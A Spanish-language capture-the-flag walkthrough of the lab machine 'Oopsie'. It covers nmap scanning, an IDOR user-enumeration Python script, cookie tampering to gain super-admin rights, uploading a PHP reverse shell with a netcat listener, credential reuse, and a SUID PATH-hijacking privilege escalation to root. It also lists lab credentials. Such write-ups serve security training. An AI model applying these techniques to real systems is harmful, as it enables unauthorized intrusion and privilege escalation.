# OOPSIE

## Reconocimiento

### Nmap
Lo primero que haremos será enumerar los puertos abiertos en la máquina víctima, para ello usaremos [nmap](https://github.com/nmap/nmap), al que le indicaremos que queremos filtrar el rango de puertos completo, que solo nos muestre los puertos que estén abiertos y que usaremos el método de enumeración TCP Syn Port Scan. Opcionalmente se pueden desactivar el descubrimiento de hosts y la resolución DNS para agilizar el escaneo. Por último, exportaremos las evidencias al fichero allPorts:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.28
```

```bash
File: allPorts

# Nmap 7.91 scan initiated Tue Jun  8 13:24:24 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.28
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.28 ()	Status: Up
Host: 10.10.10.28 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
# Nmap done at Tue Jun  8 13:24:36 2021 -- 1 IP address (1 host up) scanned in 12.44 seconds
```

<br>

Efectuaremos un escaneo más exhaustivo para ver los servicios y versiones que corren bajo estos puertos abiertos, exportaremos las evidencias al fichero targeted:

```bash
nmap -sC -sV -p22,80 -oN targeted 10.10.10.28
```

```bash
File: targeted

# Nmap 7.91 scan initiated Tue Jun  8 13:25:11 2021 as: nmap -sC -sV -p22,80 -oN targeted 10.10.10.28
Nmap scan report for 10.10.10.28
Host is up (0.050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  8 13:25:20 2021 -- 1 IP address (1 host up) scanned in 8.99 seconds
```

<br>

### Servidor web
Veremos que tenemos abiertos el puerto 22 (SSH) y el puerto 80 (HTTP). Lo primero que haremos será consultar la página web desde nuestro navegador. Nos encontraremos:

<img src="https://i.imgur.com/UPQLaqT.png" width="700"/>

A primera vista, veremos que la página web es estática y que no tiene recursos adicionales, miraremos el código fuente para ver si podemos obtener algún tipo de información.

Al final del código fuente de la página podremos ver lo siguiente:

```html
<script src="[/cdn-cgi/login/script.js](http://10.10.10.28/cdn-cgi/login/script.js)"></script>

<script src="[/js/index.js](http://10.10.10.28/js/index.js)"></script>
```

Como vemos, dos scripts de la página web se alojaran en directorios que no conocíamos hasta ahora, los directorios son:
- http://10.10.10.28/js
- http://10.10.10.28/cdn-cgi/login

<br>

A la primera de las rutas no podremos acceder, pero en la segunda de ellas encontraremos el siguiente panel de registro:

<img src="https://i.imgur.com/OuFJqEX.png" width="700"/>

Lo primero que haremos será comprobar si las credenciales de la máquina Archetype nos podrían servir para esta, probaremos con nombres de usuario comunes como administrator y admin. Veremos que el usuario correcto es:

```plaintext
File: webCreds

admin:MEGACORP_4dm1n!!
```

Nos logearemos con estas credenciales y veremos lo siguiente:

<img src="https://i.imgur.com/JPk1OI6.png" width="700"/>
											
<br>
<br>

## Shell de usuario

### Enumeración
Lo primero que haremos será investigar las diferentes páginas que contiene la web, la primera página potencial de ataque que podremos ver será uploads, en la que se nos ocurre aprovecharnos de la vulnerabilidad file upload:

<img src="https://i.imgur.com/wZCGv1n.png" width="700"/>

<br>

Como vemos, no tendremos permisos para acceder a la página de uploads por lo que seguiremos investigando el resto de la web.

La siguiente página que veremos será account, esta página nos proporcionará información sobre nuestro usuario. Lo interesante de esta página es que si observamos la URL podremos ver que el ID del usuario está indicado directamente como parámetro php.

Además de eso, si nos fijamos en las peticiones que se están realizando al servidor web, podremos ver que la cookie de sesión está sin encriptar y que uno de los parámetros de la misma coincide con el Access ID en la pestaña accounts:

<img src="https://i.imgur.com/28A2MAY.png" width="500"/>

<br>

<img src="https://i.imgur.com/1Eab6lH.png" width="700"/>

<br>

<img src="https://i.imgur.com/PgYkaw1.png" width="250"/>

<br>

### User gathering
Programaremos un script en [Python3](https://www.python.org/downloads/) que nos itere por los distintos IDs y nos represente los usuarios válidos y el ID de la cookie de cada uno de ellos:

```python
File: idScraper.py

#!/usr/bin/python3
#coding=utf-8


#PHP ID Parameter Scraper 
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import re
import time

from pwn import *

def makeRequests():
    s = requests.Session()
    log.progress("Empezando escaneo\n")

    headers = {
        'cookie' : 'user=34322; role=admin'
    }

    for i in range(50):
        url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=%s" % i    
        
        data = {
            'content': 'accounts',
            'id': i
        }
        
        r = s.get(url,headers=headers,data=data)
        
        username = re.findall(r'</td><td>(.*?)</td><td>',r.text)[0]
        cookieId = re.findall(r'<tr><td>(.*?)</td><td>',r.text)[0]

        if username != '' and cookieId != '':
            print("[+] User: %11s    UrlId: %.2d    CookieId: %.7s" % (username,i,cookieId))
    
    log.success("Escaneo completado")

if __name__ == "__main__":
    try:
        makeRequests()
    except:
        log.failure("No se ha podido escanear la web")
```

Lo ejecutaremos y veremos lo siguiente:

```plaintext
File: webUsers

[x] Empezando escaneo
[+] User:       admin    UrlId: 01    CookieId: 34322
[+] User:        john    UrlId: 04    CookieId: 8832
[+] User:       Peter    UrlId: 13    CookieId: 57633
[+] User:       Rafol    UrlId: 23    CookieId: 28832
[+] User: super admin    UrlId: 30    CookieId: 86575
[+] Escaneo completado
```

Podemos ver que uno de los usuarios que se lista es super admin, justo el usuario que necesitábamos ser para subir archivos en la pestaña uploads.

<br>

### Cookie Hijacking
Mediante la extensión [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg) de Google Chrome podremos hacer un Cookie Hijacking y convertirnos en el usuario SuperAdministrador, lo que nos dará acceso a la subida de archivos:

<img src="https://i.imgur.com/ZNbI3sQ.png" width="400"/>

<br>

<img src="https://i.imgur.com/ibqIUlE.png" width="700"/>

<br>

### File Upload Vulnerability
Yo he decidido usar la reverse shell PHP de [PentestMonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell), ya que es una reverse shell bastante robusta y fiable para paneles de subida de archivos.

Una vez subido el archivo, tendremos que buscar el directorio en el que se alojará nuestro script para comprobar si el código PHP se está interpretando en el lado del servidor.

Para ello aplicaremos Fuzzing mediante la herramienta [wfuzz](https://github.com/xmendez/wfuzz):

```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e raw 10.10.10.28/FUZZ > fuzzing
```

Nos dará como resultado:

```plaintext
File: fuzzing

Target: http://10.10.10.28/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200    478 L	    1222 W	  10932 Ch	  "# directory-list-2.3-medium.txt"
00003:  C=200    478 L	    1222 W	  10932 Ch	  "# Copyright 2007 James Fisher"
00006:  C=200    478 L	    1222 W	  10932 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00007:  C=200    478 L	    1222 W	  10932 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00005:  C=200    478 L	    1222 W	  10932 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200    478 L	    1222 W	  10932 Ch	  "#"
00008:  C=200    478 L	    1222 W	  10932 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00013:  C=200    478 L	    1222 W	  10932 Ch	  "#"
00014:  C=200    478 L	    1222 W	  10932 Ch	  "http://10.10.10.28/"
00012:  C=200    478 L	    1222 W	  10932 Ch	  "# on atleast 2 different hosts"
00009:  C=200    478 L	    1222 W	  10932 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00011:  C=200    478 L	    1222 W	  10932 Ch	  "# Priority ordered case sensative list, where entries were found"
00016:  C=301      9 L	      28 W	    311 Ch	  "images"
00004:  C=200    478 L	    1222 W	  10932 Ch	  "#"
00010:  C=200    478 L	    1222 W	  10932 Ch	  "#"
00127:  C=301      9 L	      28 W	    311 Ch	  "themes"
00164:  C=301      9 L	      28 W	    312 Ch	  "uploads"
00550:  C=301      9 L	      28 W	    308 Ch	  "css"
00953:  C=301      9 L	      28 W	    307 Ch	  "js"

Total time: 0
Processed Requests: 1636
Filtered Requests: 1617
Requests/sec.: 0
```

Podremos ver el directorio uploads y el directorio images, directorios típicos en los que se guardan archivos, empezaremos por el directorio uploads.

Si intentamos acceder a la ruta http://10.10.10.28/uploads directamente, veremos que no tenemos permisos de directory listing. Como sabemos, no tener permisos para acceder a un directorio no implica no tener permisos para acceder a los archivos que contenga el directorio, por lo tanto, probaremos si nuestra Reverse Shell se encuentra en este directorio. Veremos que no obtenemos ningún error por lo que supondremos que el código PHP se está interpretando.

Nos pondremos en escucha con [Netcat](http://netcat.sourceforge.net/) por el puerto 443:

```bash
nc -nlvp 443
```

Lo siguiente que haremos será apuntar a nuestro script en PHP a través de la dirección http://10.10.10.28/uploads/rev-shell.php

Con esto, obtendremos una reverse shell como el usuario www-data. 

Cabe destacar que tendremos permisos de lectura de la flag user.txt en el directorio /home/robert por lo que podremos visualizarla:

<img src="https://i.imgur.com/GahngT3.png" width="600"/>

<br>

## User pivoting

### Enumeración
Ahora que tenemos una shell como el usuario www-data, comenzaremos a enumerar el sistema. Si nos dirigimos al directorio /home podremos ver que hay un usuario llamado robert presente en esta máquina.

Como somos el usuario www-data y por lo tanto, tenemos permisos sobre los archivos alojados en el servidor web, comenzaremos a enumerar los mismos. Recordemos que la web tenía un panel de registros por lo que podría haber algún tipo de base de datos que aloje los usuarios de la misma.

Encontraremos el archivo db.php en el directorio /var/www/html/cdn-cgi/login/, este archivo contendrá las siguientes credenciales:

```plaintext
File: mysSQLCreds

robert:M3g4C0rpUs3r!
```

<br>

### Credential reuse
Como tenemos un usuario a nivel de sistema con el nombre robert probaremos a reutilizar estas credenciales. Para migrar de usuario:

```bash
su robert
```

Conseguiremos una shell como el usuario robert.

<br>

## Root shell

### Enumeración
Comenzaremos a enumerar el usuario robert para ver si podemos escalar privilegios. Lo primero que haremos será usar el comando id para ver los grupos a los que pertenece:

<img src="https://i.imgur.com/3yImLMM.png" width="600"/>

Como vemos pertenece a un grupo que no es común en sistemas Linux y que es el grupo bugtracker. Usaremos esta pista más tarde.

Lo próximo, será insepeccionar los archivos que tengan permisos SUID en la máquina. Estos permisos nos permitirán ejecutar un archivo con los permisos del usuario que lo creó y no con los permisos del usuario que lo está ejecutando. Para ello usaremos el comando:

```bash
find / \-perm -4000 2>/dev/null
```

La mayoría de los comandos que se listen serán propios de máquinas Linux, pero hay uno que nos llamará la atención: /usr/bin/bugtracker. Por lo que procederemos a inspeccionarlo:

<img src="https://i.imgur.com/GZLYWmR.png" width="600"/>

Como vemos al ejecutarlo, nos pedira un ID correspondiente a un "bug". Si le proporcionamos un ID aleatorio, veremos como se nos reporta un error que nos está exponiendo la ruta desde la que se están leyendo estos "bugs" y el comando con el que se están leyendo, en este caso el comando cat.

Ya que estamos ante un binario procederemos a ejecutar el comando strings para listar las cadenas imprimibles que contenga el archivo:

```bash
strings /usr/bin/bugtracker
```

<br>

<img src="https://i.imgur.com/T6sBaRD.png" width="250"/>

Como vemos, encontraremos la cadena cat /root/reports/, que nos indicará que se está llamando al comando cat desde una ruta relativa y no absoluta, esto es, el sistema irá buscando el binario cat por orden en la variable de entorno $PATH hasta dar con él.

<br>

### Path Hijacking
El problema de que este procedimiento se realice en orden es que podríamos modificar la variable de entorno $PATH para que la primera entrada de la misma apuntase a un directorio en el que definiésemos nuestra propia función cat, lo que haría que se ejecutase nuestro cat "falso" en vez del binario cat que se encuentra en /bin. 

Por lo que exportaremos a la variable de entorno $PATH nuestro directorio actual, en este caso /tmp:

<img src="https://i.imgur.com/6xG3Izk.png" width="700"/>

Además, recordemos que el archivo tenía permisos SUID y su propietario era root por lo que si conseguimos spawnear una shell, será como el usuario root.

En el directorio /tmp, crearemos el siguiente archivo:

```bash
File: cat

/bin/bash
```

Al ejecutar de nuevo el binario bugtracker, podremos ver como el comando cat se reemplaza por el que hemos creado nosotros y conseguiremos una reverse shell como el usuario root. En este momento podremos ver la flag root.txt en el directorio /root:

<img src="https://i.imgur.com/l6e9wBG.png" width="300"/>

<br>

## Post-Explotación
### Enumeración
Ya que estamos explotando máquinas que tienen relación entre ellas, probaremos a buscar alguna credencial de usuario que nos pueda servir para alguna de las próximas máquinas. 

Para ello, lo primero que haremos será listar el directorio /root. En él encontraremos un directorio .config que contendrá configuraciones definidas para el usuario root.

<br>

### Harcoded password
Dentro del directorio .config estará el archivo FILEZILLA que contendrá credenciales de usuario en texto plano para un servidor FTP:

```xml
File: FILEZILLA

<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<FileZilla3>
    <RecentServers>
        <Server>
            <Host>10.10.10.46</Host>
            <Port>21</Port>
            <Protocol>0</Protocol>
            <Type>0</Type>
            <User>ftpuser</User>
            <Pass>mc@F1l3ZilL4</Pass>
            <Logontype>1</Logontype>
            <TimezoneOffset>0</TimezoneOffset>
            <PasvMode>MODE_DEFAULT</PasvMode>
            <MaximumMultipleConnections>0</MaximumMultipleConnections>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
```